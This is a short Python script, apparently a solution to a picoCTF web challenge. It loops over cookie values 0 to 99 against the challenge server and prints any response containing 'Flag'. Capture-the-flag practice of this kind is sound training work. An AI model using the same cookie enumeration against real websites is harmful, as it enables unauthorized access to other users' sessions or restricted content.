```python
import urllib.request

url = 'http://mercury.picoctf.net:29649/'

for i in range(100):
    request = urllib.request.Request(url)
    request.add_header('Cookie', 'name = '+str(i))
    response = urllib.request.urlopen(request)
    responseStr = str(response.read().decode("utf-8"))
    if responseStr.__contains__('Flag'):
        print(responseStr)
```
